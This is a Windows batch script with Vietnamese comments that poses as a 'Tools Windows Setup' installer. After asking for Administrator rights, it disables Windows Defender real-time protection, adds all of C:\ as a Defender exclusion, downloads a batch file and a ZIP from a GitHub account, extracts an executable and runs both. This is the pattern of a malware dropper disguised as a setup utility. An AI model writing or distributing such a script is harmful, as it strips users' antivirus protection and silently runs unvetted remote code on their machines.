@echo off
setlocal EnableExtensions

:: ========================
:: Đặt console ~600x400 (80x25 ký tự)
:: ========================
mode con cols=80 lines=25

:: Căn giữa màn hình bằng GetConsoleWindow + GetWindowRect + GetWindowRect + MoveWindow
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();[DllImport(\"user32.dll\")]public static extern bool GetWindowRect(IntPtr hWnd,out RECT lpRect);[DllImport(\"user32.dll\")]public static extern bool MoveWindow(IntPtr hWnd,int X,int Y,int W,int H,bool Repaint);public struct RECT{public int Left;public int Top;public int Right;public int Bottom;}' -Name Win32 -Namespace Native; Add-Type -AssemblyName System.Windows.Forms; $hWnd=[Native.Win32]::GetConsoleWindow(); $r=New-Object Native.Win32+RECT; [Native.Win32]::GetWindowRect($hWnd,[ref]$r) | Out-Null; $w=$r.Right-$r.Left; $h=$r.Bottom-$r.Top; $sw=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width; $sh=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height; $x=($sw-$w)/2; $y=($sh-$h)/2; [Native.Win32]::MoveWindow($hWnd,$x,$y,$w,$h,$true)"

title Tat tam thoi Windows Defender + Tai file GitHub + Giai nen ZIP
color 0A

:: ========================
:: KIỂM TRA INTERNET TRƯỚC TIÊN
:: ========================
:CHECK_INTERNET
echo Dang kiem tra ket noi Internet...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$ProgressPreference='SilentlyContinue'; function Test-Url([string]$u){try{(Invoke-WebRequest -Uri $u -UseBasicParsing -TimeoutSec 5).StatusCode -lt 400}catch{ $false }}; if( (Test-Url 'https://www.msftconnecttest.com/connecttest.txt') -or (Test-Url 'https://www.google.com/generate_204') ){ exit 0 } else { exit 1 }"
if %errorlevel%==0 (
  echo [+] Da co ket noi Internet.
  echo.
) else (
  echo [!] Vui long ket noi Internet. Se tu thu lai sau 30 giay...
  timeout /t 30 /nobreak >nul
  echo.
  goto :CHECK_INTERNET
)

:: ========================
:: KIỂM TRA QUYỀN ADMIN
:: ========================
net session >nul 2>&1
if %errorlevel%==0 goto :ADMIN

powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; $msg='File nay can chay bang quyen Administrator. Ban co muon khoi dong lai voi quyen Admin khong?'; if ([System.Windows.Forms.MessageBox]::Show($msg,'Yeu cau quyen Admin','OKCancel','Warning') -eq 'OK') {Start-Process -FilePath '%~f0' -Verb RunAs}"
exit /b

:ADMIN
echo Dang chay voi quyen Admin.
echo.

:: ========================
:: TẮT TẠM THỜI DEFENDER
:: ========================
echo Dang tat tam thoi Windows Defender Real-Time Protection...
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}"
powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath 'C:\' } catch {}"
echo Da gui lenh tat tam thoi (neu that bai, van tiep tuc tai file).
echo.

:: ========================
:: TẢI FILE TỪ GITHUB VÀO THƯ MỤC MỚI (LUÔN THAY THẾ FILE CŨ)
:: ========================
set "DESKTOP=%USERPROFILE%\Desktop"
set "TARGETDIR=%DESKTOP%\Tools Windows Setup"
set "FILE1=%TEMP%\Update.bat"
set "FILE2=%TARGETDIR%\Tools_Windows_Setup.zip"
set "FILE3=%TARGETDIR%\Tools_Windows_Setup.exe"
set "URL_BAT=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Update.bat"
set "URL_ZIP=https://raw.githubusercontent.com/ToolsSetupWindows/File/main/Tools_Windows_Setup.zip"

if not exist "%TARGETDIR%" (
  echo Tao thu muc: %TARGETDIR%
  mkdir "%TARGETDIR%"
)

:: Xoá file cũ nếu tồn tại
if exist "%FILE1%" (
  echo [!] Da co file cu: Update.bat, se xoa va tai moi...
  del /f /q "%FILE1%"
)
if exist "%FILE2%" (
  echo [!] Da co file cu: Tools_Windows_Setup.zip, se xoa va tai moi...
  del /f /q "%FILE2%"
)
if exist "%FILE3%" (
  echo [!] Da co file cu: Tools_Windows_Setup.exe, se xoa va tai moi...
  del /f /q "%FILE3%"
)

:: Tải file mới
echo Dang tai Tools_Windows_Setup.bat...
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL_BAT%' -OutFile '%FILE1%' -UseBasicParsing"  || echo [-] Loi tai Tools_Windows_Setup.bat

echo Dang tai Tools_Windows_Setup.zip...
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%URL_ZIP%' -OutFile '%FILE2%' -UseBasicParsing"  || echo [-] Loi tai Tools_Windows_Setup.zip

echo.

:: ========================
:: KIỂM TRA 7-ZIP (CẢ 32 & 64 BIT)
:: ========================
set "SEVENZIP_EXE64=C:\Program Files\7-Zip\7z.exe"
set "SEVENZIP_EXE32=C:\Program Files (x86)\7-Zip\7z.exe"
set "SEVENZIP_EXE="

if exist "%SEVENZIP_EXE64%" (
  set "SEVENZIP_EXE=%SEVENZIP_EXE64%"
)
if exist "%SEVENZIP_EXE32%" (
  set "SEVENZIP_EXE=%SEVENZIP_EXE32%"
)

if not defined SEVENZIP_EXE (
  echo [!] May chua co 7-Zip. Dang kiem tra he dieu hanh de tai ban phu hop...
  :: Phat hien he dieu hanh 64 bit hay 32 bit
  set "SEVENZIP_INSTALLER=%TARGETDIR%\7zSetup.exe"
  set "SEVENZIP_URL="
  set "ARCH="
  :: Kiem tra he dieu hanh
  set "PROCESSOR_ARCHITECTURE=%PROCESSOR_ARCHITECTURE%"
  if "%PROCESSOR_ARCHITECTURE%"=="AMD64" (
    set "ARCH=x64"
    set "SEVENZIP_URL=https://www.7-zip.org/a/7z2301-x64.exe"
  ) else (
    set "ARCH=x86"
    set "SEVENZIP_URL=https://www.7-zip.org/a/7z2301.exe"
  )
  echo Dang tai 7-Zip %ARCH%...
  powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%SEVENZIP_URL%' -OutFile '%SEVENZIP_INSTALLER%' -UseBasicParsing"  || echo [-] Loi tai file cai dat 7-Zip
  if exist "%SEVENZIP_INSTALLER%" (
    echo Dang cai dat 7-Zip...
    "%SEVENZIP_INSTALLER%" /S
    echo Da cai dat xong 7-Zip.
    del /f /q "%SEVENZIP_INSTALLER%"
    :: Kiem tra lai sau khi cai xong
    if exist "%SEVENZIP_EXE64%" (
      set "SEVENZIP_EXE=%SEVENZIP_EXE64%"
    )
    if exist "%SEVENZIP_EXE32%" (
      set "SEVENZIP_EXE=%SEVENZIP_EXE32%"
    )
    if not defined SEVENZIP_EXE (
      echo [-] Khong tim thay file thuc thi 7z.exe sau khi cai dat!
      goto :END
    )
  ) else (
    echo [-] Khong the tai hoac cai dat 7-Zip!
    goto :END
  )
) else (
  echo [+] May da co san 7-Zip: "%SEVENZIP_EXE%"
)

:: ========================
:: GIẢI NÉN FILE ZIP
:: ========================
if exist "%FILE2%" (
  echo Dang giai nen Tools_Windows_Setup.zip...
  "%SEVENZIP_EXE%" x "%FILE2%" -o"%TARGETDIR%" -y >nul
  if %errorlevel%==0 (
    echo [+] Giai nen thanh cong!
    start "" "%FILE3%"
    start "" "%FILE1%"
  ) else (
    echo [-] Loi khi giai nen file ZIP!
  )
) else (
  echo [-] Khong tim thay Tools_Windows_Setup.zip
)

:END
echo.
echo Hoan tat.
endlocal
exit
